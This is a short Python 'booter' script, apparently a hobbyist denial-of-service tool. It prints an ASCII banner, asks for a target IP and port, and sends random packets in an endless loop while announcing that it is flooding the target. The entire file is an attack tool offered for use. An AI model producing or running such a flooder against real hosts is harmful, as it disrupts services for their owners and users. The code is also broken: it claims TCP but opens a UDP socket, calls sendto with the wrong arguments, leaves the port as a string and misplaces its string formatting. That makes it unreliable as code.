#!/usr/bin/env python3
# this is my python3 script booter
# this will flood with tcp packets

import socket
import random


banner = (
	' ▄▀▀█▄▄   ▄▀▀█▄▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄      ▄▀▀▄ █  ▄▀▀█▀▄    ▄▀▀█▄▄   ▄▀▀▀▀▄   \n'
	'█ ▄▀   █ █ ▄▀   █ █      █ █ █   ▐     █  █ ▄▀ █   █  █  █ ▄▀   █ █     ▄▀ \n'
	'▐ █    █ ▐ █    █ █      █    ▀▄       ▐  █▀▄  ▐   █  ▐  ▐ █    █ ▐ ▄▄▀▀    \n'
	'  █    █   █    █ ▀▄    ▄▀ ▀▄   █        █   █     █       █    █   █       \n'
	' ▄▀▄▄▄▄▀  ▄▀▄▄▄▄▀   ▀▀▀▀    █▀▀▀       ▄▀   █   ▄▀▀▀▀▀▄   ▄▀▄▄▄▄▀    ▀▄▄▄▄▀ \n'
	'█     ▐  █     ▐            ▐          █    ▐  █       █ █     ▐         ▐  \n'
	'▐        ▐                             ▐       ▐       ▐ ▐                  \n'
	)


def ban():
	print(banner)

ban()

ppl = 1024

send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(ppl)

target = input('Enter IP here: ')
pass
port = input('Enter Port here: ')
pass

loop = 0

while 1:
	stringss = str(ppl)
	send.sendto((bytes, (target, port)))
	print('FlooDing this %s on port %s with Phsycopath V1!!!') % (target, port)
	loop = loop + 1
